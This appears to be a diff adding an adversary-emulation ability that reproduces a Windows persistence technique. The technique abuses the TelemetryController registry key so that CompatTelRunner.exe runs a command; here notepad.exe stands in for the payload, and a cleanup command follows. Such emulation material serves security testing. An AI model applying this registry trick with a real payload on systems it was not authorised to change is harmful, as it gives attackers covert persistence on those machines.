@@ -1,0 +1,19 @@
+---
+- id: 906ff46a13d648c1aba30a77916dced9
+  name: Abusing Windows TelemetryController Registry Key for Persistence
+  description: "The Windows Compatibility Telemetry system makes use of the CompatTelRunner.exe\
+    \ binary to run a variety of telemetry tasks. It relies on the registry for instructions\
+    \ on which commands to run. \nIt will run any arbitrary command without restriction\
+    \ of location or type. Blog :https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence\n"
+  tactic: multiple
+  technique:
+    attack_id: T1112
+    name: Modify Registry
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\NewKey"
+          /t REG_SZ /v Command /d C:\Windows\System32\notepad.exe /f
+        payloads: []
+        cleanup: reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\NewKey"
+          /f
